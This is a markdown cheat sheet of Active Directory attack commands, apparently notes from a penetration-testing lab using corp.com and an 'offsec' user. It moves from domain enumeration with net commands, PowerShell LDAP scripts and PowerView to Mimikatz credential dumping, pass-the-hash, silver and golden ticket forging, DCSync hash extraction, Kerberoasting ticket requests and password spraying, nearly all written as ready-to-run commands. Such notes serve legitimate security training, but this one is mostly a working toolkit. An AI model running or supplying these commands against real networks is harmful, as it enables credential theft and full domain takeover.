# Enumeration
**Enumerate local accounts**
`net user`

**Enumerate users within the entire domain**
`net user /domain`

**Enumerate user information within a domain**
`net user someone /domain`

**Enumerate Groups within a domain**
`net group /domain`

**Enumerate accounts**
`net accounts`

### Powershell Methods
**Get Current Domain Name**
`[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()`

**Script to search for things within the Domain **
```
# This is only an example. Keep in mind, you can view $prop to filter out whatever you want in the same fashion of what is done here

$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter=""
$Result = $Searcher.FindAll()
Write-Host "All systems with Windows 10 and their version: "
Foreach($obj in $Result)
{

    Foreach($prop in $obj.Properties)
    { 
        if($prop.operatingsystem -match 'Windows 10')
        {
            Write-Host($prop.cn,"-",$prop.operatingsystem)
            Write-Host " "
        }

    }
}
```

*You can add `$Searcher.filter="name=Jeff_Admin"` as a filter*

**Script to search SPNs**
```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"
$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="serviceprincipalname=*http*"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
}
```

**Script to search all groups and their nested levels**
```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain

function RecurGroup($n,$d)
{

    "$("   "*$d)$n"
    $Searcher.filter="(name=$n)"
    $Result=$Searcher.FindAll()
    Foreach ($obj in $Result)
    {
        $mem=$obj.Properties.member
        if ($mem)
        {
            $memr=($mem.Split(',') -match "CN").Split("=")[1]
            $d++   
            if ($depth -lt 14)
            {
                RecurGroup $memr $d   
            }
        }   
    }
}
$Searcher.filter="(objectClass=Group)"
$Result = $Searcher.FindAll()
Write-Host "Groups and Their Members"
$cns=@()
Foreach($obj in $Result)
{
    $cns+=($obj.Properties.name)
}

Foreach($i in $cns)
{   
    RecurGroup $i 0
}
```

## PowerView
**Logged on users on some computer**
```
Get-NetLoggedon -ComputerName client251
```

**Logging in Sessions on some computer**
```
Get-NetSession -ComputerName dc01
```

## Get-SPN
```
Get-SPN -type service -search "*" -List yes | Format-Table -AutoSize
```

## Mimikatz
```
mimikatz.exe
privilege::debug (Engage SeDebugPrivilege)
sekurlsa::logonpasswords (Dump hashes)

[Kerberos]
sekurlsa::tickets
kerberos::list /export (export tickets)

sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe

[pass the ticket]
silver ticket
kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt 
To obtain SID - whoami /user (dont take the last 4 bytes. they are relative)

[Dumps krbtgt pass for golden ticket over all domains via domain controller]
lsadump::lsa /patch

kerberos::purge to delete tickets

lsadump::dcsync /user:Administrator
[Dumps all hashes after syncing with a domain controller via replication]
```

## Service Accounts
```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'

then klist to check
```

## Password Spraying
```
Spray-Passwords.ps1 -File pass.txt -Admins
```
